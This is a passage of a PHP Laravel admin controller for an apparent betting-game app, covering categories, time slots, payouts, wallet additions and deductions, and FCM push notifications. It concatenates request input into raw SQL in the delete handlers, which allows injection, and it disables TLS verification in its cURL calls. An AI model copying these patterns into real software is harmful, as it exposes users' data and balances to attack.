<?php
namespace App\Http\Controllers\admin;
use App\Http\Controllers\Controller;
use Illuminate\Foundation\Auth\AuthenticatesUsers;
use Illuminate\Support\Facades\File;
use Illuminate\Support\Facades\Redirect;
use Illuminate\Support\Facades\Validator;
use Illuminate\Http\Request;
use App\User;
use App\Common;
use App\User_wallet;
use App\Time_slots;
use App\Play_type;
use App\Game_type;
use App\Balance_request;
use App\Withdraw_request;
use App\Transactions;
use App\News;
use App\News_board;
use App\Category;
use App\Slider;
use App\Cp_digits;
use App\Deduction;
use App\Addition;
use App\User_bit_transaction;
use App\Win_price_calculation;
use App\Telescope_entries;
use Input;
use Session;
use Carbon;
use Auth;
use Image;
use DB;
use Helpers;
use Hash;
use Config;


//require_once('public/mpdf/vendor/autoload.php');
class AdminController extends Controller {
    use AuthenticatesUsers;
	protected $userModel;
	protected $timeSlotsModel;
	protected $gameTypeModel;
	protected $userBitTransactionModel;
	protected $balanceRequestModel;
	protected $withdrawRequestModel;
	protected $userTransactionsModel;
	protected $userWalletModel;
	public function __construct(){
		$this->userModel 					= new User;
		$this->timeSlotsModel 				= new Time_slots;
		$this->gameTypeModel 				= new Game_type;
		$this->userBitTransactionModel 		= new User_bit_transaction;
		$this->balanceRequestModel 			= new Balance_request;
		$this->withdrawRequestModel 		= new Withdraw_request;
		$this->userTransactionsModel		= new Transactions;
		$this->userWalletModel				= new User_wallet;

		$this->middleware('auth');
        $this->middleware(function ($request, $next) {
        $this->id = Auth::user()->id;
		 Helpers::set_elescope_entries($this->id);
        return $next($request);
       });
    }
    /**
     * Where to redirect users after login.
     *
     * @var string
     */
    protected $redirectTo = '/administrator/dashboard';
    /**
     * Display admin dashboard.
     *
     */
    public function dashboard(){
    	$title 		= "Dashboard";
    	$breadcumbs = "Dashboard";
    	$active 	= "dashboard";
		$param = array();
		$param['current_date'] 	= date('Y-m-d');
		$param['current_time'] 	= date('h:i a');
		$total_user				= $this->userModel->where('user_type',2)->count();
		$total_withdraw_request = $this->withdrawRequestModel->count();
		$total_balance_request 	= $this->balanceRequestModel->count();
		$total_user_balance 	= $this->userWalletModel->sum('balance');
		$chart_result 			= $this->withdrawRequestModel->getChartResult($param);
		$current_game_chart_result = $this->userBitTransactionModel->getChartCurrentGame($param);

		//echo '<pre>';print_r($chart_result);exit;



        return view('admin.dashboard', compact('title','breadcumbs','active','total_user','total_withdraw_request','total_balance_request','total_user_balance','current_game_chart_result','chart_result'));
    }






	public function category(){
		$title 			= "Category";
        $breadcumbs 	= "Category";
        $active 		= "category";
		$meta_data 		= array();
        $search 		= Input::get('s');
        $cur_page 		= Input::get('pg');
        $cur_page 		= $cur_page == '' ? 1 : $cur_page;
        $per_page		= 20;
        $limit_start	= ($cur_page - 1) * $per_page;
        $param = array();
        $param['search'] 		= $search;
        $param['cur_page'] 		= $cur_page;
        $param['per_page'] 		= $per_page;
        $param['limit_start']	= $limit_start;
		$category_list = Category::get_data($param);
		//echo '<pre>';print_r($category_list);exit;
		return view('admin.category/index', compact('title','active','breadcumbs','category_list'));
    }
	public function addCategory(){
		$title 			= "Add Category";
        $breadcumbs 	= "Add Category";
        $active 		= "category";
		$data			= [];
		$category_thumb	= asset('public/images/no_image-150x150.png');
		return view('admin.category/form', compact('title','active','breadcumbs','category_thumb','data'));
    }
	public function editCategory($id){
		$title 			= "Edit Category";
        $breadcumbs 	= "Edit Category";
        $active 		= "category";
		$data = Category::where('id',$id)->first();
		$category_thumb	= isset($data->image)?Helpers::category_image($data->image): asset('public/images/no_image-150x150.png');
		//echo '<pre>';print_r($category_thumb);exit;
		return view('admin.category/form', compact('title','active','breadcumbs','category_thumb','data'));
    }
	public function deleteCategory() {
		$category_id = Input::get('id');
		if ($category_id != null) {
			$check = DB::table('time_slots')->whereRaw('FIND_IN_SET('.$category_id.',category_id)')->first();
			if(!empty($check)){
				Session::flash('error', 'Can not be deleted as time slot are in this date slot !');
			}else{
				Common::deleteData('category','id',$category_id);
				Session::flash('success', 'Category deleted successfully.');
			}
		}else{
			Session::flash('error', 'Something wrong please try again !');
		}
		return redirect::back();
	}
	public function saveCategoryRequest(Request $request){
		$category_id	= Input::get('category_id');
		$label 			= Input::get('label');
		$name 			= Input::get('category');
		$image 			= Input::get('image');
		$status 		= Input::get('status');
		$validator = Validator::make($request->all(), [
			'label'		=> 'required',
			'category' 	=> 'required',
        ]);
		if($validator->fails()){
			$errors=$validator->errors()->all();
			$error_html='';
			foreach($errors as $er){
				$error_html .='<span>'.$er.'</span></br>';
			}
			Session::flash('error', $error_html);
			return redirect::back();
			//return back()->withInput()->withErrors(['error'=>'Phone or password is invalid!']);
        }else{
			$slug=Helpers::create_slug($label.''.$name);
			if($category_id!=''){
				$category = Category::find($category_id);
				$category->label	= $label;
    			$category->name 	= $name;
    			$category->slug 	= $slug;
				$category->image 	= $image;
				$category->status 	= $status;
    			$category->save();
			}else{
				$category = new Category;
				$category->label	= $label;
    			$category->name 	= $name;
    			$category->slug 	= $slug;
				$category->image 	= $image;
				$category->status 	= $status;
    			$category->save();
			}
			Session::flash('success', 'Successfully Saved data.');
		}
		return redirect('administrator/category');
	}
	public function news(){
		$title 			= "News";
        $breadcumbs 	= "News";
        $active 		= "news";
		$meta_data 		= array();
        $search 		= Input::get('s');
        $cur_page 		= Input::get('pg');
        $cur_page 		= $cur_page == '' ? 1 : $cur_page;
        $per_page		= 20;
        $limit_start	= ($cur_page - 1) * $per_page;
        $param = array();
        $param['search'] 		= $search;
        $param['cur_page'] 		= $cur_page;
        $param['per_page'] 		= $per_page;
        $param['limit_start']	= $limit_start;
		$news_list = News::get_data($param);
		//echo '<pre>';print_r($news_list);exit;
		return view('admin.news/index', compact('title','active','breadcumbs','news_list'));
    }
	public function addNews(){
		$title 			= "Add News";
        $breadcumbs 	= "Add News";
        $active 		= "news";
		$data			= [];
		return view('admin.news/form', compact('title','active','breadcumbs','data'));
    }
	public function editNews($id){
		$title 			= "Edit News";
        $breadcumbs 	= "Edit News";
        $active 		= "news";
		$data 			= News::where('id',$id)->first();
		//echo '<pre>';print_r($category_thumb);exit;
		return view('admin.news/form', compact('title','active','breadcumbs','data'));
    }
	public function deleteNews() {
		$id = Input::get('id');
		if ($id != null) {
			Common::deleteData('news','id',$id);
			Session::flash('success', 'News deleted successfully.');
		}else{
			Session::flash('error', 'Something wrong please try again !');
		}
		return redirect::back();
	}
	public function saveNewsRequest(Request $request){
		$news_id	= Input::get('news_id');
		$name 		= Input::get('news');
		$status 	= Input::get('status');
		$validator = Validator::make($request->all(), [
			'news'		=> 'required',
			'status' 	=> 'required',
        ]);


		//print_r($_POST);exit;

		if($validator->fails()){
			$errors=$validator->errors()->all();
			$error_html='';
			foreach($errors as $er){
				$error_html .='<span>'.$er.'</span></br>';
			}
			Session::flash('error', $error_html);
			return redirect::back();
        }else{
			$slug=Helpers::create_slug($name);
			if($news_id!=''){
				$news = News::find($news_id);
				$news->name		= $name;
    			$news->slug 	= $slug;
				$news->status 	= $status;
    			$news->save();
			}else{
				$news = new News;
				$news->name		= $name;
    			$news->slug 	= $slug;
				$news->status 	= $status;
    			$news->save();
			}
			Session::flash('success', 'Successfully Saved data.');
		}
		return redirect('administrator/news');
	}
	public function cpSlot(){
		$title 			= "CP Digits";
        $breadcumbs 	= "CP Digits";
        $active 		= "cp_slot";
		$meta_data 		= array();
        $search 		= Input::get('s');
        $cur_page 		= Input::get('pg');
        $cur_page 		= $cur_page == '' ? 1 : $cur_page;
        $per_page		= 20;
        $limit_start	= ($cur_page - 1) * $per_page;
        $param = array();
        $param['search'] 		= $search;
        $param['cur_page'] 		= $cur_page;
        $param['per_page'] 		= $per_page;
        $param['limit_start']	= $limit_start;
		$cp_list = Cp_digits::get_data($param);
	/*$dight='100 200 300 400 500 600 700 800 900 000 678 345 120 789 456 123 890 567 234 127 777 444 111 888 555 222 999 666 333 190 560 570 580 590 140 150 160 170 180 280 470 480 490 130 230 330 340 350 360 370 380 390 670 680 690 240 250 260 270 460 290 660 238 248 258 268 278 288 450 550 119 129 139 149 159 169 179 189 199 235 137 237 337 347 357 367 377 116 117 118 236 336 157 158 799 448 467 233 469 578 146 246 346 446 267 899 115 459 126 145 669 679 689 699 780 124 125 667 479 579 255 355 455 447 790 223 224 478 668 399 147 247 266 366 466 666 477 135 299 588 228 256 112 113 358 557 990 225 334 489 499 166 356 122 880 368 134 488 245 688 599 239 177 114 359 558 379 389 155 148 338 249 556 449 369 559 226 227 138 788 257 339 259 269 378 289 569 178 144 778 344 156 889 349 133 445 220 229 770 440 388 677 279 577 136 335 110 348 457 188 128 589 779 167 168 277 458 468 668 244';
	$dight_array=explode(' ',$dight);
	for($i=0;count($dight_array)>$i;$i++){
		$cp_digits = new Cp_digits;
		$cp_digits->digit	= $dight_array[$i];
		$cp_digits->save();
	}
	echo '<pre>';
		print_r($dight_array);
		print_r($dight);
		exit;
*/
		return view('admin.cp_slot/index', compact('title','active','breadcumbs','cp_list'));
    }
	public function addCpSlot(){
		$title 			= "Add CP Digits";
        $breadcumbs 	= "Add CP Digits";
        $active 		= "cp_slot";
		$data			= [];
		return view('admin.cp_slot/form', compact('title','active','breadcumbs','data'));
    }
	public function editCpSlot($id){
		$title 			= "Edit CP Digits";
        $breadcumbs 	= "Edit CP Digits";
        $active 		= "cp_slot";
		$data 			= Cp_digits::where('id',$id)->first();
		//echo '<pre>';print_r($category_thumb);exit;
		return view('admin.cp_slot/form', compact('title','active','breadcumbs','data'));
    }
	public function deleteCpSlot() {
		$id = Input::get('id');
		if ($id != null) {
			Common::deleteData('cp_digits','id',$id);
			Session::flash('success', 'Digit deleted successfully.');
		}else{
			Session::flash('error', 'Something wrong please try again !');
		}
		return redirect::back();
	}
	public function saveCpSlotRequest(Request $request){
		$cp_id	= Input::get('cp_id');
		$digit 	= Input::get('digit');
		$status	= Input::get('status');
		$validator = Validator::make($request->all(), [
			'digit'		=> 'required',
			'status' 	=> 'required',
        ]);
		if($validator->fails()){
			$errors=$validator->errors()->all();
			$error_html='';
			foreach($errors as $er){
				$error_html .='<span>'.$er.'</span></br>';
			}
			Session::flash('error', $error_html);
			return redirect::back();
        }else{
			if($cp_id!=''){
				$cp_digits = Cp_digits::find($cp_id);
				$cp_digits->digit	= $digit;
				$cp_digits->status 	= $status;
    			$cp_digits->save();
			}else{
				$cp_digits = new Cp_digits;
				$cp_digits->digit	= $digit;
				$cp_digits->status 	= $status;
    			$cp_digits->save();
			}
			Session::flash('success', 'Successfully Saved data.');
		}
		return redirect('administrator/cp_slot');
	}
	public function addition(){
		$title 			= "Addition List";
        $breadcumbs 	= "Addition List";
        $active 		= "addition";
		$meta_data 		= array();
        $search 		= Input::get('s');
        $cur_page 		= Input::get('pg');
        $cur_page 		= $cur_page == '' ? 1 : $cur_page;
        $per_page		= 20;
        $limit_start	= ($cur_page - 1) * $per_page;
        $param = array();
        $param['search'] 		= $search;
        $param['cur_page'] 		= $cur_page;
        $param['per_page'] 		= $per_page;
        $param['limit_start']	= $limit_start;
		$addition_list = Addition::get_data($param);
		//echo '<pre>';print_r($addition_list);exit;
		return view('admin.money/addition', compact('title','active','breadcumbs','addition_list'));
    }
	public function addAddition(){
		$title 			= "Add Addition";
        $breadcumbs 	= "Add Addition";
        $active 		= "addition";
		return view('admin.money/addition_form', compact('title','active','breadcumbs'));
    }
	public function saveAdditionRequest(Request $request){
		$customer_id	= Input::get('customer_id');
		$amount			= Input::get('amount');
		$validator = Validator::make($request->all(), [
			'customer_id'	=> 'required',
			'amount' 		=> 'required',
        ]);
		if($validator->fails()){
			$errors=$validator->errors()->all();
			$error_html='';
			foreach($errors as $er){
				$error_html .='<span>'.$er.'</span></br>';
			}
			Session::flash('error', $error_html);
			return redirect::back();
        }else{
			$wallet_data 	= Common::getSingelData($where=['user_id'=>$customer_id],$table='user_wallet',$data=['balance'],'id','ASC');
			$balance_gross 	= isset($wallet_data->balance)? $wallet_data->balance:'0';
			$wallet_amount = 0;
			$wallet_amount+= $balance_gross;
			$wallet_amount+= $amount;
			Common::updateData($table="user_wallet", "user_id", $customer_id, array('balance'=>$wallet_amount,'updated_at'=>date('Y-m-d H:i:s')));
			$addition = new Addition;
			$addition->user_id	= $customer_id;
			$addition->amount 	= $amount;
    		$addition->save();
			$SERVER_API_KEY = Config::get('notification.SERVER_API_KEY');
			$token_list = User::whereNotNull('device_token')->where('id',$customer_id)->get()->toArray();


			//print_r($token_list);exit;
			$msg = array(
				'body'  => 'Amount-'.$amount." .Tap to refresh.",
				'title' => strtoupper('Balance added successfully')
			);
			$data = $msg;
            $data['notification_foreground'] = true;
			$data['priceRefresh'] = 1;
			$fields = array(
				'registration_ids'  => array_column($token_list,'device_token'),
				'notification'      => $msg,
				'data'				=> $data
			);
			$dataString = json_encode($fields);



			$headers = [
				'Authorization: key=' . $SERVER_API_KEY,
				'Content-Type: application/json',
			];
			$ch = curl_init();
			curl_setopt($ch, CURLOPT_URL, 'https://fcm.googleapis.com/fcm/send');
			curl_setopt($ch, CURLOPT_POST, true);
			curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
			curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
			curl_setopt($ch, CURLOPT_POSTFIELDS, $dataString);
			$response = curl_exec($ch);


			//print_r($response);exit;
			Session::flash('success', 'Successfully Saved data.');
		}
		return redirect('administrator/money/addition');
	}
	public function deduction(){
		$title 			= "Deduction List";
        $breadcumbs 	= "Deduction List";
        $active 		= "deduction";
		$meta_data 		= array();
        $search 		= Input::get('s');
        $cur_page 		= Input::get('pg');
        $cur_page 		= $cur_page == '' ? 1 : $cur_page;
        $per_page		= 20;
        $limit_start	= ($cur_page - 1) * $per_page;
        $param = array();
        $param['search'] 		= $search;
        $param['cur_page'] 		= $cur_page;
        $param['per_page'] 		= $per_page;
        $param['limit_start']	= $limit_start;
		$deduction_list = Deduction::get_data($param);
		//echo '<pre>';print_r($addition_list);exit;
		return view('admin.money/deduction', compact('title','active','breadcumbs','deduction_list'));
    }
	public function addDeduction(){
		$title 			= "Add Deduction";
        $breadcumbs 	= "Add Deduction";
        $active 		= "deduction";
		return view('admin.money/deduction_form', compact('title','active','breadcumbs'));
    }
	public function saveDeductionRequest(Request $request){
		$customer_id	= Input::get('customer_id');
		$amount			= Input::get('amount');
		$validator = Validator::make($request->all(), [
			'customer_id'	=> 'required',
			'amount' 		=> 'required',
        ]);
		if($validator->fails()){
			$errors=$validator->errors()->all();
			$error_html='';
			foreach($errors as $er){
				$error_html .='<span>'.$er.'</span></br>';
			}
			Session::flash('error', $error_html);
			return redirect::back();
        }else{
			$wallet_data 	= Common::getSingelData($where=['user_id'=>$customer_id],$table='user_wallet',$data=['balance'],'id','ASC');
			$balance_gross 	= isset($wallet_data->balance)? $wallet_data->balance:'0';
			$wallet_amount = 0;
			$wallet_amount+= $balance_gross;
			$wallet_amount-= $amount;
			Common::updateData($table="user_wallet", "user_id", $customer_id, array('balance'=>$wallet_amount,'updated_at'=>date('Y-m-d H:i:s')));
			$deduction = new Deduction;
			$deduction->user_id	= $customer_id;
			$deduction->amount 	= $amount;
    		$deduction->save();
			$SERVER_API_KEY = Config::get('notification.SERVER_API_KEY');

			$token_list = User::whereNotNull('device_token')->where('id',$customer_id)->get()->toArray();





			$msg = array(
				'body'  => 'Amount-'.$amount." .Tap to refresh.",
				'title' => strtoupper('Withdraw successfully')
			);
			$data = $msg;
            $data['notification_foreground'] = true;
			$data['priceRefresh'] = 1;
			$fields = array(
				'registration_ids'  => array_column($token_list,'device_token'),
				'notification'      => $msg,
				'data'				=> $data
			);
			$dataString = json_encode($fields);


			$headers = [
				'Authorization: key=' . $SERVER_API_KEY,
				'Content-Type: application/json',
			];
			$ch = curl_init();
			curl_setopt($ch, CURLOPT_URL, 'https://fcm.googleapis.com/fcm/send');
			curl_setopt($ch, CURLOPT_POST, true);
			curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
			curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
			curl_setopt($ch, CURLOPT_POSTFIELDS, $dataString);
			$response = curl_exec($ch);


			Session::flash('success', 'Successfully Saved data.');
		}
		return redirect('administrator/money/deduction');
	}
	public function slider(){
		$title 			= "Slider";
        $breadcumbs 	= "Slider";
        $active 		= "slider";
		$meta_data 		= array();
        $search 		= Input::get('s');
        $cur_page 		= Input::get('pg');
        $cur_page 		= $cur_page == '' ? 1 : $cur_page;
        $per_page		= 20;
        $limit_start	= ($cur_page - 1) * $per_page;
        $param = array();
        $param['search'] 		= $search;
        $param['cur_page'] 		= $cur_page;
        $param['per_page'] 		= $per_page;
        $param['limit_start']	= $limit_start;
		$slider_list = Slider::get_data($param);
		//echo '<pre>';print_r($news_list);exit;
		return view('admin.slider/index', compact('title','active','breadcumbs','slider_list'));
    }
	public function addSlider(){
		$title 			= "Add Slider";
        $breadcumbs 	= "Add Slider";
        $active 		= "slider";
		$data			= [];
		$thumb	= asset('public/images/no_image-150x150.png');
		return view('admin.slider/form', compact('title','active','breadcumbs','thumb','data'));
    }
	public function editSlider($id){
		$title 			= "Edit Slider";
        $breadcumbs 	= "Edit Slider";
        $active 		= "slider";
		$data 			= Slider::where('id',$id)->first();
		$thumb	= isset($data->image)?Helpers::category_image($data->image): asset('public/images/no_image-150x150.png');
		//echo '<pre>';print_r($category_thumb);exit;
		return view('admin.slider/form', compact('title','active','breadcumbs','thumb','data'));
    }
	public function deleteSlider() {
		$id = Input::get('id');
		if ($id != null) {
			Common::deleteData('slider','id',$id);
			Session::flash('success', 'Slider deleted successfully.');
		}else{
			Session::flash('error', 'Something wrong please try again !');
		}
		return redirect::back();
	}
	public function saveSliderRequest(Request $request){
		$slider_id		= Input::get('slider_id');
		$title 			= Input::get('title');
		$title2 		= Input::get('title2');
		$title3 		= Input::get('title3');
		$desc 			= Input::get('desc');
		$image 			= Input::get('image');
		$status 		= Input::get('status');
		$validator = Validator::make($request->all(), [
			'title'		=> 'required',
			'status' 	=> 'required',
        ]);
		if($validator->fails()){
			$errors=$validator->errors()->all();
			$error_html='';
			foreach($errors as $er){
				$error_html .='<span>'.$er.'</span></br>';
			}
			Session::flash('error', $error_html);
			return redirect::back();
        }else{
			if($slider_id!=''){
				$slider = Slider::find($slider_id);
				$slider->title	= $title;
				$slider->title2	= $title2;
				$slider->title3	= $title3;
				$slider->desc	= $desc;
    			$slider->image 	= $image;
				$slider->status = $status;
    			$slider->save();
			}else{
				$slider = new Slider;
				$slider->title	= $title;
				$slider->title2	= $title2;
				$slider->title3	= $title3;
				$slider->desc	= $desc;
    			$slider->image 	= $image;
				$slider->status = $status;
    			$slider->save();
			}
			Session::flash('success', 'Successfully Saved data.');
		}
		return redirect('administrator/slider');
	}
	public function slot(){
		$title 			= "Slot";
        $breadcumbs 	= "Slot";
        $active 		= "slot";
		$meta_data 		= array();
        $search 		= Input::get('s');
        $cur_page 		= Input::get('pg');
        $cur_page 		= $cur_page == '' ? 1 : $cur_page;
        $per_page		= 20;
        $limit_start	= ($cur_page - 1) * $per_page;
        $param = array();
        $param['search'] 		= $search;
        $param['cur_page'] 		= $cur_page;
        $param['per_page'] 		= $per_page;
        $param['limit_start']	= $limit_start;
		$slot_list = Time_slots::get_data($param);
		//echo '<pre>';print_r($slot_list);exit;
		return view('admin.slot/index', compact('title','active','breadcumbs','slot_list'));
    }
	public function addSlot(){
		$title 			= "Add Slot";
        $breadcumbs 	= "Add Slot";
        $active 		= "slot";
		$data			= [];
		$category_list = Category::get();
		return view('admin.slot/form', compact('title','active','breadcumbs','data','category_list'));
    }
	public function editSlot($id){
		$title 			= "Edit Slot";
        $breadcumbs 	= "Edit Slot";
        $active 		= "slot";
		$data 			= Time_slots::where('id',$id)->first();
		$category_list  = Category::get();
		//echo '<pre>';print_r($category_thumb);exit;
		return view('admin.slot/form', compact('title','active','breadcumbs','data','category_list'));
    }
	public function deleteSlot() {
		$id = Input::get('id');
		if ($id != null) {
			$check = DB::table('category')->whereRaw('FIND_IN_SET('.$id.',id)')->first();
			if(!empty($check)){
				Session::flash('error', 'Can not be deleted as time slot are in this date slot !');
			}else{
				Common::deleteData('time_slots','id',$id);
				Session::flash('success', 'Slot deleted successfully.');
			}
		}else{
			Session::flash('error', 'Something wrong please try again !');
		}
		return redirect::back();
	}
	public function saveSlotRequest(Request $request){
		$slot_id		= Input::get('slot_id');
		$category_id 	= Input::get('category_id');
		$start_time		= Input::get('start_time');
		$end_time		= Input::get('end_time');
		$status 		= Input::get('status');
		$validator = Validator::make($request->all(), [
			'category_id'	=> 'required',
			'start_time'	=> 'required',
			'end_time'		=> 'required',
			'status' 		=> 'required',
        ]);
		if($validator->fails()){
			$errors=$validator->errors()->all();
			$error_html='';
			foreach($errors as $er){
				$error_html .='<span>'.$er.'</span></br>';
			}
			Session::flash('error', $error_html);
			return redirect::back();
        }else{
			$from_time	= date('h:i a',strtotime($start_time));
			$to_time	= date('h:i a',strtotime($end_time));
			$from_time_slug	= date('H:i',strtotime($start_time));
			$to_time_slug	= date('H:i',strtotime($end_time));
			$time 			= strtotime($to_time);
			$result_time 	= date("h:i a", strtotime('+30 minutes', $time));
			//$game_type_id	= 1;
			if($slot_id!=''){
				$slots = Time_slots::find($slot_id);
				$slots->from_time		= $from_time;
    			$slots->from_time_slug 	= $from_time_slug;
				$slots->to_time			= $to_time;
    			$slots->to_time_slug 	= $to_time_slug;
				$slots->result_time 	= $result_time;
				$slots->category_id		= $category_id;
				$slots->status 			= $status;
    			$slots->save();
			}else{
				$slots = new Time_slots;
				$slots->from_time		= $from_time;
    			$slots->from_time_slug 	= $from_time_slug;
				$slots->to_time			= $to_time;
    			$slots->to_time_slug 	= $to_time_slug;
				$slots->result_time 	= $result_time;
				$slots->category_id		= $category_id;
				$slots->status 			= $status;
    			$slots->save();
			}
			Session::flash('success', 'Successfully Saved data.');
		}
		return redirect('administrator/slot');
	}
	public function winningPrice(){
		$title 			= "Winning Price";
        $breadcumbs 	= "Winning Price";
        $active 		= "winningPrice";
		$meta_data 		= array();
        $search 		= Input::get('s');
        $cur_page 		= Input::get('pg');
        $cur_page 		= $cur_page == '' ? 1 : $cur_page;
        $per_page		= 20;
        $limit_start	= ($cur_page - 1) * $per_page;
        $param = array();
        $param['search'] 		= $search;
        $param['cur_page'] 		= $cur_page;
        $param['per_page'] 		= $per_page;
        $param['limit_start']	= $limit_start;
		$price_list = Win_price_calculation::get_data($param);
		//echo '<pre>';print_r($price_list);exit;
		return view('admin.winningPrice/index', compact('title','active','breadcumbs','price_list'));
    }
	public function addWinningPrice(){
		$title 			= "Add Winning Price";
        $breadcumbs 	= "Add Winning Price";
        $active 		= "winningPrice";
		$data			= [];
		$category_list = Category::get();
		$type_list  	= Play_type::get();
		return view('admin.winningPrice/form', compact('title','active','breadcumbs','data','category_list','type_list'));
    }
	public function editWinningPrice($id){
		$title 			= "Edit Winning Price";
        $breadcumbs 	= "Edit Winning Price";
        $active 		= "winningPrice";
		$data 			= Win_price_calculation::where('id',$id)->first();
		$category_list  = Category::get();
		$type_list  	= Play_type::get();
		//echo '<pre>';print_r($category_thumb);exit;
		return view('admin.winningPrice/form', compact('title','active','breadcumbs','data','category_list','type_list'));
    }
	public function deleteWinningPrice() {
		$id = Input::get('id');
		if ($id != null) {
			Common::deleteData('win_price_calculation','id',$id);
			Session::flash('success', 'Price deleted successfully.');
		}else{
			Session::flash('error', 'Something wrong please try again !');
		}
		return redirect::back();
	}
	public function saveWinningPriceRequest(Request $request){
		$calculation_id		= Input::get('calculation_id');
		$category_id 		= Input::get('category_id');
		$play_type			= Input::get('play_type');
		$calculation_type	= Input::get('calculation_type');
		$value				= Input::get('value');
		$validator = Validator::make($request->all(), [
			'category_id'		=> 'required',
			'play_type'			=> 'required',
			'calculation_type'	=> 'required',
			'value'				=> 'required',
        ]);
		if($validator->fails()){
			$errors=$validator->errors()->all();
			$error_html='';

			foreach($errors as $er){
				$error_html .='<span>'.$er.'</span></br>';
			}
			Session::flash('error', $error_html);
			return redirect::back();
        }else{
			if($calculation_id!=''){
				$calculation = Win_price_calculation::find($calculation_id);
				$calculation->category_id		= $category_id;
    			$calculation->play_type 		= $play_type;
				$calculation->calculation_type	= $calculation_type;
    			$calculation->value 			= $value;
    			$calculation->save();
			}else{
				$calculation = new Win_price_calculation;
				$calculation->category_id		= $category_id;
    			$calculation->play_type 		= $play_type;
				$calculation->calculation_type	= $calculation_type;
    			$calculation->value 			= $value;
    			$calculation->save();
			}
			Session::flash('success', 'Successfully Saved data.');
		}
		return redirect('administrator/winning-price');
	}
	public function game(){
		$title 			= "Game List";
        $breadcumbs 	= "Game List";
        $active 		= "game";
		$meta_data 		= array();
        $search 		= Input::get('s');
        $cur_page 		= Input::get('pg');
        $cur_page 		= $cur_page == '' ? 1 : $cur_page;
        $per_page		= 20;
        $limit_start	= ($cur_page - 1) * $per_page;
        $param = array();
        $param['search'] 		= $search;
        $param['cur_page'] 		= $cur_page;
        $param['per_page'] 		= $per_page;
        $param['limit_start']	= $limit_start;
		$game_type_list = $this->gameTypeModel->get_data($param);
		//echo '<pre>';print_r($game_type_list);exit;
		return view('admin.game/index', compact('title','active','breadcumbs','game_type_list'));
    }
	public function addGame(){
		$title 			= "Add Game";
        $breadcumbs 	= "Add Game";
        $active 		= "game";
		$data			= [];
		$category_list 	= Category::get();
		$type_list     	= Play_type::get();
		$time_slots		= [];
		$thumb			= asset('public/images/no_image-150x150.png');
		$days			= isset($data->day)?explode(',',$data->day):[];
		//$t=date('d-m-Y');
		//date("l",strtotime($t));exit;
		//echo '<pre>';print_r($time_slots);exit;
		return view('admin.game/form', compact('title','active','breadcumbs','data','category_list','type_list','time_slots','thumb','days'));
    }
	public function editGame($id){
		$title 			= "Edit Game";
        $breadcumbs 	= "Edit Game";
        $active 		= "game";
		$data 			= $this->gameTypeModel->where('id',$id)->first();
		$category_list	= Category::get();
		$type_list  	= Play_type::get();
		$time_slots  	= Time_slots::where('category_id',$data->category_id)->get();
		$thumb			= isset($data->image)?Helpers::category_image($data->image): asset('public/images/no_image-150x150.png');
		$days			= isset($data->day)?explode(',',$data->day):[];
		//echo '<pre>';print_r($days);exit;
		return view('admin.game/form', compact('title','active','breadcumbs','data','category_list','type_list','time_slots','thumb','days'));
    }
	public function deleteGame() {
		$game_type_id = Input::get('id');
		if ($game_type_id != null) {
			$check = Common::getSingelData($where=['game_type'=>$game_type_id],$table='avality_time_date_slots',$data=['id'],'id','ASC');
			if(!empty($check)){
				Session::flash('error', 'Can not be deleted as date or time slot are in this game type !');
			}else{
				Common::deleteData('game_type','id',$game_type_id);
				Session::flash('success', 'Date slot deleted successfully.');
			}
        }else{
			Session::flash('error', 'Something wrong please try again !');
		}
        return redirect::back();
    }
	public function saveGameRequest(Request $request){
		$game_id 		= Input::get('game_id');
		$category_id	= Input::get('category_id');
		$name			= Input::get('name');
		$time_slot_id	= Input::get('time_slot_id');
		$play_day		= Input::get('play_day');
		$minum_coin		= Input::get('minum_coin');
		$image			= Input::get('image');
		$status			= Input::get('status');
		$validator = Validator::make($request->all(), [
			'category_id'		=> 'required|string|max:255',
			//'name.*'			=> "required|string|distinct|min:1",
			//'time_slot_id.*'	=> "required|string|distinct|min:1",
			"play_day.*"  		=> "required|string|distinct|min:1",
			'minum_coin'		=> 'required|string|max:255',
			'status' 			=> 'required|string|max:255',
        ]);
		if($validator->fails()){
			$errors=$validator->errors()->all();
			$error_html='';
			foreach($errors as $er){
				$error_html .='<span>'.$er.'</span></br>';
			}
			Session::flash('error', $error_html);
			return redirect::back();
        }else{
			$days		= implode(',',$play_day);





			if($game_id!=''){
				$game = Game_type::find($game_id);
				$game->name				= $name;
    			$game->category_id 		= $category_id;
				$game->time_slot_id		= $time_slot_id;
    			$game->day 				= $days;
				$game->min_bid_amount	= $minum_coin;
    			$game->image 			= $image;
				$game->status			= $status;
				//echo '<pre>';print_r($game);exit;
    			$game->save();
			}else{
				for($i=0;count($time_slot_id)>$i;$i++){
					$game = new Game_type;
					$game->name				= $name[$i];
					$game->category_id 		= $category_id;
					$game->time_slot_id		= $time_slot_id[$i];
					$game->day 				= $days;
					$game->min_bid_amount	= $minum_coin;
					$game->image 			= $image;
					$game->status			= $status;
					$game->save();

				}

			}
			Session::flash('success', 'Successfully Saved data.');
		}
        return redirect('administrator/game');
	}
	public function uploadCsvRequest(Request $request){
		$csvMimes = array('text/x-comma-separated-values', 'text/comma-separated-values', 'application/octet-stream', 'application/vnd.ms-excel', 'application/x-csv', 'text/x-csv', 'text/csv', 'application/csv', 'application/excel', 'application/vnd.msexcel', 'text/plain');
		if(!empty($_FILES['upload_csv']['name']) && in_array($_FILES['upload_csv']['type'], $csvMimes)){
			if(is_uploaded_file($_FILES['upload_csv']['tmp_name'])){
				$csvFile = fopen($_FILES['upload_csv']['tmp_name'], 'r');
				fgetcsv($csvFile);
				while(($line = fgetcsv($csvFile)) !== FALSE){
					$category_name   		= $line[0];
					$category_label   		= $line[1];
					$game_name   			= $line[2];
					$start_time   			= $line[3];
					$end_time   			= $line[4];
					$days   				= $line[5];
					$minum_coin   			= $line[6];
					$type   				= $line[7];
					$calculation_type   	= $line[8];
					$calculation_amount   	= $line[9];
					$status   				= $line[10];
					if($category_name!='' && $start_time!='' && $end_time!=''){
						 $category_slug	= Helpers::create_slug($category_label.''.$category_name);
						 $category_data = Category::where('slug',$category_slug)->first();
						 $category_id	= isset($category_data->id)?$category_data->id: '';
						 if($category_id==''){
							 $category = new Category;
							 $category->label	= $category_label;
							 $category->name 	= $category_name;
							 $category->slug 	= $category_slug;
							 $category->save();
							 $category_id = $category->id;
						}
